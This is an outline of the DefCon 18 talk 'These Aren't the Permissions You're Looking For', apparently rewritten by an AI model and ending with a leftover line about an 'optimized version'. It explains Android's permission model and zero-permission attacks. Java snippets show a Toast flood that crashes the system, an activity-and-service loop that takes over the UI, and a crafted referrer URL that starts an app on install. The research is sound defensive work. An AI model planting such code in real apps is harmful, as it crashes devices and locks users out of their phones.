# These Aren’t the Permissions You’re Looking For

## Authors
- Anthony Lineberry
- David Luke Richardson
- Tim Wyatt

## Conference
DefCon 18

## Agenda
- Overview of Android Internals
- Security and Permission Model
- Why Ask for Permission When You Can Ask for Forgiveness?
- Logcat: Our Inside Mole
- The Ultimate Permission (Root Access)
- Mitigation Strategies

### Android Internals: Diving into the Belly of the Beast

#### AndroidManifest.xml
- **Every application must have one.**
- **Package Name:** A unique identifier for each app.
- **Components:** Describes application components such as Activities, Services, and BroadcastReceivers.
- **Requested Permissions:** Declares permissions needed to access protected APIs.
- **Permissions for Interaction:** Specifies permissions other applications need to interact with the app's components.

#### Activity
- **User Interaction:** Provides a way for users to interact with the application.
- **Views:** Composed of various UI elements like Button, TextView, ImageView, etc.
- **Activity Stack:** Managed as a stack where the foreground activity is on top and in an active state, while previous activities are paused.
- **Inter-Application Interaction:** An app can start another app’s activity, but the callee doesn’t necessarily have access to the activity’s data. This can be restricted using the `permission` attribute in the manifest.

#### Intent
- **Abstract Description:** An abstract description of an operation to be performed.
- **Simple IPC:** Used for inter-process communication.
- **Data Transfer:** Can be used to start an activity or broadcast system-wide.
- **Components:** Consists of an action and data (URI: http:, content:, geo:, etc.).
  ```java
  Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.google.com"));
  startActivity(myIntent);
  ```

#### BroadcastReceiver
- **Intent Receiver:** Receives intents.
- **Creation:** Can be created dynamically with `registerBroadcast()` or declared in the manifest.
- **Broadcast Types:**
  - **Normal Broadcasts:** Asynchronous and cannot be aborted.
  - **Ordered Broadcasts:** Delivered serially and can be aborted or pass results to the next receiver.
- **Permissions:** Can enforce permissions for who can send or receive the intent.

#### Service
- **Background Work:** Component for performing work in the background.
- **Not a Separate Process or Thread:** Similar to an Activity without a UI.
- **Access Control:** Can enforce access to the service with required permissions.

### Security/Permission Model: The Mythical Sandbox

#### The Sandbox
- **Unix Multi-User Model:** Not a VM sandbox, but a Unix multi-user (uid/gid) sandbox.
- **Unique UID:** Each app has a different UID.
- **Lightweight VM:** Runs for each process.
- **UID Sharing:** Apps can request to share a UID if both are signed with the same key.

#### Permissions
- **Default:** No permissions granted by default.
- **Granular Access:** Finer-grained access to content and APIs (e.g., `android.permission.READ_SMS`, `android.permission.CHANGE_WIFI_STATE`).
- **Declaration:** Declared in `AndroidManifest.xml`.

### Why Ask for Permission When You Can Ask for Forgiveness?

#### Importance of Permissions
- **Gatekeeping:** Permissions control what an app can do.
- **User Consent:** Users must approve permissions before downloading an app.
- **Transparency:** Users can determine whether permissions are appropriate.

#### Zero Permissions
- **No Permission Screen:** Straight to download.
- **User Concerns:** Users may not worry about apps that Android doesn’t warn about.

### Reboot with Zero Permissions

- **REBOOT Permission:** Not normally grantable to apps; requires `SystemOrSignature`.
- **Exploitation:** Using Toast notifications to create weak JNI references in `system_server`.
  ```java
  while (true) {
      Toast.makeText(getApplicationContext(), "Hello World", Toast.LENGTH_LONG).show();
  }
  ```
- **Result:** Excessive JNI global references leading to a system crash.

### Start on Install with Zero Permissions

- **Trick:** Use in conjunction with another attack.
- **Google Analytics Referrer Tracking:** Write a custom BroadcastReceiver.
- **Caveats:** Requires referrer information in the URL leading to the app.
  ```plaintext
  market://details?id=com.nethack&referrer=utm_source%3Dadmob%26utm_medium%3Dbanner%26utm_term%3Darcade%252Bgame%26utm_campaign%3DMalicious_Campaign
  ```

### Circle of Death: UI Hostile Takeover with Zero Permissions

- **KeyPress Consumption:** Launch an activity that consumes all key presses.
- **Relaunch Mechanism:** Relaunch the activity when it exits.
- **Service Loop:** Use a service to relaunch the destroyed activity.
  ```java
  // MaliciousActivity
  public boolean onKeyDown(int keyCode, KeyEvent event) {
      return true;
  }

  // RestartService
  public void onCreate() {
      super.onCreate();
      startActivity(new Intent(getApplicationContext(), MaliciousActivity.class)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
  }
  ```

This optimized version provides a clearer and more professional structure, making the content easier to understand and follow.